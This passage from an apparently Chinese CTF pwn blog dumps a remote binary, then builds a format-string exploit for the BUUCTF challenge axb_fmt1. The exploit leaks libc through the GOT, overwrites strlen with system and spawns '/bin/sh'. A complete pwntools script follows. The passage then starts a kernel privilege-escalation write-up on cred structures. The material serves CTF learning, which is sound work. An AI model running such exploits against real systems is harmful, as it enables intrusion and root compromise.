                <span class="token keyword">break</span>

            <span class="token keyword">if</span> len<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#为0的话,说明读到的值为0,就没有输出,但数据还是要的补上</span>
                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>
                addr <span class="token operator">+=</span> <span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                data <span class="token operator">+=</span> <span class="token string">'\x00'</span> <span class="token comment" spellcheck="true"># 注意字符串结尾是'\x00'是不会打印的,要得补上</span>
                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
                addr <span class="token operator">+=</span> len<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> base_addr<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#这里就是输出的进度了.</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'dumping: '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>addr <span class="token operator">-</span> base_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>data_length<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> isDisconnect <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#断开重新连接.</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Error.'</span><span class="token punctuation">)</span>
            io <span class="token operator">=</span> remote<span class="token punctuation">(</span>remoteIp<span class="token punctuation">,</span> remotePort<span class="token punctuation">)</span>
            isDisconnect <span class="token operator">=</span> <span class="token boolean">False</span>
            sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>


    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    getbinary<span class="token punctuation">(</span><span class="token punctuation">)</span>    

<span class="token comment" spellcheck="true">#--------------------------Main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre>
<p>然后就静静的等待,若开启输出太多加上是远程dump,可能一个小时都还没dump 10k,尽量关掉输出.</p>
<p>dump文件之后如下:</p>
<pre class=" language-python"><code class="language-python">logan@LYXF<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>share<span class="token operator">/</span>axb_fmt1$ cat binary
ELF�<span class="token number">4</span>`<span class="token number">4</span>     <span class="token punctuation">(</span><span class="token number">44</span>�<span class="token number">4</span>�  TT�T����    �    �<span class="token number">4d</span>����hh�h�DDP�td����<span class="token punctuation">,</span><span class="token punctuation">,</span>Q�tdR�
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
<h3 id="IDA分析dump的文件"><a href="#IDA分析dump的文件" class="headerlink" title="IDA分析dump的文件"></a>IDA分析dump的文件</h3><p>所dump的文件不能反编译为c语言伪代码,只能看汇编.</p>
<pre><code>_init_proc    LOAD    08048418    00000023    0000000C    00000000    R    .    .    .    .    .    .
sub_8048450    LOAD    08048450    00000006            R    .    .    .    .    .    .
sub_8048460    LOAD    08048460    00000006            R    .    .    .    .    .    .
sub_8048470    LOAD    08048470    00000006            R    .    .    .    .    .    .
j_start    LOAD    08048480    00000006            .    .    .    .    .    .    .
sub_8048490    LOAD    08048490    00000006            R    .    .    .    .    .    .
sub_80484A0    LOAD    080484A0    00000006            R    .    .    .    .    .    .
sub_80484B0    LOAD    080484B0    00000006            R    .    .    .    .    .    .
sub_80484C0    LOAD    080484C0    00000006            R    .    .    .    .    .    .
sub_80484D0    LOAD    080484D0    00000006            R    .    .    .    .    .    .
sub_80484E0    LOAD    080484E0    00000006            R    .    .    .    .    .    .
__gmon_start__    LOAD    080484F0    00000006            R    .    .    .    .    .    .
start    LOAD    08048500    00000022            .    .    .    .    .    .    .
sub_8048530    LOAD    08048530    00000004    00000000    00000000    R    .    .    .    .    .    .
sub_8048540    LOAD    08048540    0000002B    00000000    00000000    R    .    .    .    .    .    .
sub_80485B0    LOAD    080485B0    0000001E    00000000    00000000    R    .    .    .    .    .    .
sub_80485D0    LOAD    080485D0    0000002B            R    .    .    .    .    .    .
sub_8048760    LOAD    08048760    0000005D    00000010    0000000C    R    .    .    .    .    .    .
nullsub_1    LOAD    080487C0    00000002    00000000    00000000    R    .    .    .    .    .    .
_term_proc    LOAD    080487C4    00000014    0000000C    00000000    R    .    .    .    .    .    .
</code></pre>
<p>也可以看到,基本的函数也出来了, 但没有发现main函数,找相关逻辑代码吧</p>
<pre><code>LOAD:080486AD                 lea     eax, [ebp-138h]
LOAD:080486B3                 push    eax
LOAD:080486B4                 call    sub_80484D0
LOAD:080486B9                 add     esp, 10h
LOAD:080486BC                 sub     esp, 0Ch
LOAD:080486BF                 push    offset aPleaseTellMe ; &quot;Please tell me:&quot;
LOAD:080486C4                 call    sub_8048470     
LOAD:080486C9                 add     esp, 10h
LOAD:080486CC                 sub     esp, 4
LOAD:080486CF                 push    100h
LOAD:080486D4                 lea     eax, [ebp-239h]
LOAD:080486DA                 push    eax
LOAD:080486DB                 push    0
LOAD:080486DD                 call    sub_8048460     
LOAD:080486E2                 add     esp, 10h
LOAD:080486E5                 sub     esp, 4
LOAD:080486E8                 lea     eax, [ebp-239h]
LOAD:080486EE                 push    eax
LOAD:080486EF                 push    offset aRepeaterS ; &quot;Repeater:%s\n&quot;
LOAD:080486F4                 lea     eax, [ebp-138h]
LOAD:080486FA                 push    eax
LOAD:080486FB                 call    sub_80484E0     
LOAD:08048700                 add     esp, 10h
LOAD:08048703                 sub     esp, 0Ch
LOAD:08048706                 lea     eax, [ebp-138h]
LOAD:0804870C                 push    eax
LOAD:0804870D                 call    sub_80484B0     
LOAD:08048712                 add     esp, 10h
LOAD:08048715                 mov     [ebp-240h], eax 
LOAD:0804871B                 cmp     dword ptr [ebp-240h], 10Eh ; compare length with 10E
LOAD:08048725                 jbe     short loc_8048741
LOAD:08048727                 sub     esp, 0Ch
LOAD:0804872A                 push    offset aWhatYouInputIs ; &quot;what you input is really long!&quot;
LOAD:0804872F                 call    sub_8048470
LOAD:08048734                 add     esp, 10h
LOAD:08048737                 sub     esp, 0Ch
LOAD:0804873A                 push    0
LOAD:0804873C                 call    sub_80484A0</code></pre>
<p>虽然找到,但不知道调用什么函数, 需要去看看符号表.</p>
<pre><code>extern:0804A06C ; extern
extern:0804A06C ; void setbuf(FILE *stream, char *buf)
extern:0804A06C                 extrn setbuf:near
extern:0804A070 ; ssize_t read(int fd, void *buf, size_t nbytes)
extern:0804A070                 extrn read:near
extern:0804A074 ; int printf(const char *format, ...)
extern:0804A074                 extrn printf:near
extern:0804A078 ; unsigned int alarm(unsigned int seconds)
extern:0804A078                 extrn alarm:near
extern:0804A07C ; int puts(const char *s)
extern:0804A07C                 extrn puts:near
extern:0804A080 ; void exit(int status)
extern:0804A080                 extrn exit:near
extern:0804A084 ; size_t strlen(const char *s)
extern:0804A084                 extrn strlen:near
extern:0804A088 ; int __cdecl _libc_start_main(int (__cdecl *main)(int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void *stack_end)
extern:0804A088                 extrn __libc_start_main:near
extern:0804A08C ; void *memset(void *s, int c, size_t n)
extern:0804A08C                 extrn memset:near
extern:0804A090 ; int sprintf(char *s, const char *format, ...)
extern:0804A090                 extrn sprintf:near
extern:0804A094                 extrn __imp___gmon_start__:near ; weak
extern:0804A094                                         ; CODE XREF: __gmon_start__↑j</code></pre>
<p>这就需要推断调用什么函数了.</p>
<pre><code>LOAD:080486AD                 lea     eax, [ebp-138h]
LOAD:080486B3                 push    eax
LOAD:080486B4                 call    sub_80484D0
LOAD:080486B9                 add     esp, 10h
LOAD:080486BC                 sub     esp, 0Ch
LOAD:080486BF                 push    offset aPleaseTellMe ; &quot;Please tell me:&quot;
LOAD:080486C4                 call    sub_8048470   // puts函数
LOAD:080486C9                 add     esp, 10h
LOAD:080486CC                 sub     esp, 4
LOAD:080486CF                 push    100h // length
LOAD:080486D4                 lea     eax, [ebp-239h]
LOAD:080486DA                 push    eax  // buf
LOAD:080486DB                 push    0    //fd
LOAD:080486DD                 call    sub_8048460     //read 函数
LOAD:080486E2                 add     esp, 10h
LOAD:080486E5                 sub     esp, 4
LOAD:080486E8                 lea     eax, [ebp-239h]
LOAD:080486EE                 push    eax // buf
LOAD:080486EF                 push    offset aRepeaterS ; &quot;Repeater:%s\n&quot; //arg 2
LOAD:080486F4                 lea     eax, [ebp-138h]
LOAD:080486FA                 push    eax  //buf2
LOAD:080486FB                 call    sub_80484E0  //sprintf函数   
LOAD:08048700                 add     esp, 10h
LOAD:08048703                 sub     esp, 0Ch
LOAD:08048706                 lea     eax, [ebp-138h] 
LOAD:0804870C                 push    eax //buf2
LOAD:0804870D                 call    sub_80484B0      / /strlen函数,传入buf2
LOAD:08048712                 add     esp, 10h
LOAD:08048715                 mov     [ebp-240h], eax ; //srlen函数的返回值 
LOAD:0804871B                 cmp     dword ptr [ebp-240h], 10Eh ; compare length with 10E
LOAD:08048725                 jbe     short loc_8048741
LOAD:08048727                 sub     esp, 0Ch
LOAD:0804872A                 push    offset aWhatYouInputIs ; &quot;what you input is really long!&quot;
LOAD:0804872F                 call    sub_8048470
LOAD:08048734                 add     esp, 10h
LOAD:08048737                 sub     esp, 0Ch
LOAD:0804873A                 push    0
LOAD:0804873C                 call    sub_80484A0</code></pre>
<h3 id="leak-libc-1"><a href="#leak-libc-1" class="headerlink" title="leak libc"></a>leak libc</h3><p>泄漏libc的话,只需泄漏某个函数的got表,就选择sprintf来泄漏吧, 点击sprintf的call sub_80484E0进入plt跳转.</p>
<pre><code>LOAD:080484E0 sub_80484E0     proc near               ; CODE XREF: LOAD:080486FB↓p
LOAD:080484E0                 jmp     ds:dword_804A030
LOAD:080484E0 sub_80484E0     endp</code></pre>
<p>点击jmp到sprintf got 表地址</p>
<pre><code>LOAD:0804A030 dword_804A030   dd 1C001Fh              ; DATA XREF: sub_80484E0↑r</code></pre>
<p>0x0804A030就是sprintf的got表地址了,那么我们就可以通过字符串漏洞泄漏该地址的内容,从而获取到libc中sprintf的地址,strlen也是同样的方法.</p>
<pre class=" language-python"><code class="language-python">    sprintf_got <span class="token operator">=</span> <span class="token number">0x0804A030</span>    
    strlen_got <span class="token operator">=</span> <span class="token number">0x0804A024</span>
    offset <span class="token operator">=</span> <span class="token number">8</span>
    <span class="token comment" spellcheck="true"># leak libc</span>
    p <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token comment" spellcheck="true"># for alignment</span>
    p <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>offset <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'$s'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sprintf_got<span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    sprintf <span class="token operator">=</span> u32<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'\xf7'</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'sprintf '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>sprintf<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token triple-quoted-string string">'''
    select:
    2: ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)
    '''</span>

    libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'sprintf'</span><span class="token punctuation">,</span> sprintf<span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> sprintf <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'sprintf'</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'libc_base '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'system '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<h4 id="修改strlen的got表内容为system"><a href="#修改strlen的got表内容为system" class="headerlink" title="修改strlen的got表内容为system"></a>修改strlen的got表内容为system</h4><p>使用字符串漏洞来进行地址写入, 使用’$hn’s 2字节分两次写入,先写小的再写大的, system的高位地址要比system的低位地址大,则先写小的.</p>
<pre class=" language-python"><code class="language-python">    high_sys <span class="token operator">=</span> system <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#获取高4位</span>
    low_sys <span class="token operator">=</span> system <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span>    <span class="token comment" spellcheck="true">#获取低4位</span>
    li<span class="token punctuation">(</span><span class="token string">'high_sys '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>high_sys<span class="token punctuation">)</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'low_sys  '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>low_sys<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># modify strlen got</span>
    pre_len <span class="token operator">=</span> len<span class="token punctuation">(</span><span class="token string">'Repeater:'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token comment" spellcheck="true">#这里为数据已经打印的长度,后面写入长度需要减掉该长度</span>
    p <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token comment" spellcheck="true"># for alignment</span>
    p <span class="token operator">+=</span> p32<span class="token punctuation">(</span>strlen_got <span class="token operator">+</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 8</span>
    p <span class="token operator">+=</span> p32<span class="token punctuation">(</span>strlen_got <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 9</span>

    p <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>low_sys <span class="token operator">-</span> pre_len<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>offset <span class="token operator">+</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'$hn'</span>
    p <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>high_sys <span class="token operator">-</span> low_sys<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>offset <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'$hn'</span>
    s<span class="token punctuation">(</span>p<span class="token punctuation">)</span></code></pre>
<h3 id="get-shell-2"><a href="#get-shell-2" class="headerlink" title="get shell"></a>get shell</h3><p>使用’; ‘分割shell命令, 再调用strlen即调用system函数</p>
<pre class=" language-python"><code class="language-python">sl<span class="token punctuation">(</span><span class="token string">'; /bin/sh'</span><span class="token punctuation">)</span></code></pre>
<h2 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>
<span class="token comment" spellcheck="true"># Author: I0gan</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher

context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
<span class="token comment" spellcheck="true">#context.terminal = ['konsole', '-x', 'bash', 'c']</span>
<span class="token comment" spellcheck="true">#context.terminal = 'konsole'</span>
<span class="token comment" spellcheck="true">#context(arch = 'i386', os = 'linux', log_level='debug')</span>
<span class="token comment" spellcheck="true">#context(arch = 'amd64', os = 'linux', log_level='debug')</span>

exeFile <span class="token operator">=</span> <span class="token string">''</span>
libFile <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>

remoteIp <span class="token operator">=</span> <span class="token string">"node3.buuoj.cn"</span>
remotePort <span class="token operator">=</span> <span class="token number">29458</span>

LOCAL <span class="token operator">=</span> <span class="token number">0</span>
LIB   <span class="token operator">=</span> <span class="token number">0</span>

r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
s   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
db    <span class="token operator">=</span> <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Func-----------------------------</span>


<span class="token comment" spellcheck="true">#--------------------------Exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sprintf_got <span class="token operator">=</span> <span class="token number">0x0804A030</span>    
    strlen_got <span class="token operator">=</span> <span class="token number">0x0804A024</span>
    offset <span class="token operator">=</span> <span class="token number">8</span>
    <span class="token comment" spellcheck="true"># leak libc</span>
    p <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token comment" spellcheck="true"># for alignment</span>
    p <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>offset <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'$s'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sprintf_got<span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    sprintf <span class="token operator">=</span> u32<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'\xf7'</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'sprintf '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>sprintf<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token triple-quoted-string string">'''
    select:
    2: ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)
    '''</span>

    libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'sprintf'</span><span class="token punctuation">,</span> sprintf<span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> sprintf <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'sprintf'</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'libc_base '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'system '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>

    high_sys <span class="token operator">=</span> system <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>
    low_sys <span class="token operator">=</span> system <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span>
    li<span class="token punctuation">(</span><span class="token string">'high_sys '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>high_sys<span class="token punctuation">)</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'low_sys  '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>low_sys<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># modify strlen got</span>
    pre_len <span class="token operator">=</span> len<span class="token punctuation">(</span><span class="token string">'Repeater:'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">+</span> <span class="token number">4</span>
    p <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token comment" spellcheck="true"># for alignment</span>
    p <span class="token operator">+=</span> p32<span class="token punctuation">(</span>strlen_got <span class="token operator">+</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 8</span>
    p <span class="token operator">+=</span> p32<span class="token punctuation">(</span>strlen_got <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 9</span>

    p <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>low_sys <span class="token operator">-</span> pre_len<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>offset <span class="token operator">+</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'$hn'</span>
    p <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>high_sys <span class="token operator">-</span> low_sys<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>offset <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'$hn'</span>

    s<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">'; /bin/sh'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIB<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_PRELOAD"</span> <span class="token punctuation">:</span> libFile<span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>remoteIp<span class="token punctuation">,</span> remotePort<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIB<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>

    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h1 id="Kenel-pwn-ciscn-2017-baby-driver"><a href="#Kenel-pwn-ciscn-2017-baby-driver" class="headerlink" title="Kenel pwn ciscn 2017 baby driver"></a>Kenel pwn ciscn 2017 baby driver</h1><p>第一天真正开始做kernel pwn类的题, 于用户空间做的体确实有点不太一样, 利用从python 转向c语言写与驱动交互的程序, 找驱动程序的漏洞, 然后提权为root</p>
<h2 id="知识预备"><a href="#知识预备" class="headerlink" title="知识预备"></a>知识预备</h2><h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><p>在linux中每个进程都有它自己的权限,而标示着权限的那些信息,比如uid，gid等都是被放在一个叫cred的结构体当中的,也就是说每个进程中都有一个cred结构,如果能够修改进程的cred的uid和gid为0, 那么该进程的权限就为root权限了.<br>以下是cred结构体:</p>
<pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">struct</span> cred <span class="token punctuation">{</span>
    atomic_t    usage<span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span>
    atomic_t    subscribers<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* number of processes subscribed */</span>
    <span class="token keyword">void</span>        <span class="token operator">*</span>put_addr<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span>    magic<span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">define</span> CRED_MAGIC  0x43736564</span>
<span class="token macro property">#<span class="token directive keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>
    kuid_t      uid<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* real UID of the task */</span>
    kgid_t      gid<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* real GID of the task */</span>
    kuid_t      suid<span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">/* saved UID of the task */</span>
    kgid_t      sgid<span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">/* saved GID of the task */</span>
    kuid_t      euid<span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">/* effective UID of the task */</span>
    kgid_t      egid<span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">/* effective GID of the task */</span>
    kuid_t      fsuid<span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">/* UID for VFS ops */</span>
    kgid_t      fsgid<span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">/* GID for VFS ops */</span>
    <span class="token keyword">unsigned</span>    securebits<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* SUID-less security management */</span>
    kernel_cap_t    cap_inheritable<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* caps our children can inherit */</span>
